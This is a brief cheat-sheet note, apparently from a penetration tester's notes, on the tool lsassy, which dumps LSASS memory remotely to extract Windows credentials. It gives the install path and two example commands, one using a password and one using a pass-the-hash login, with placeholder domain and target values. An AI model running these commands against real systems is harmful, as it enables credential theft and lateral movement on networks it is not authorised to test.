---
tags: [tool, activedirectory, lsass]
tool: "lsassy"
category: "Active Directory"
installed: true
phase: [credential]
---

# lsassy - Remote LSASS Dumper

## Tool Overview
Purpose: Extract credentials from LSASS remotely
Location: ~/.local/bin/lsassy

## How to Use It

Basic Usage:
lsassy -d domain.local -u user -p pass target

With Hashes:
lsassy -d domain.local -u user -H hash target

## Related Tools
mimikatz, pypykatz
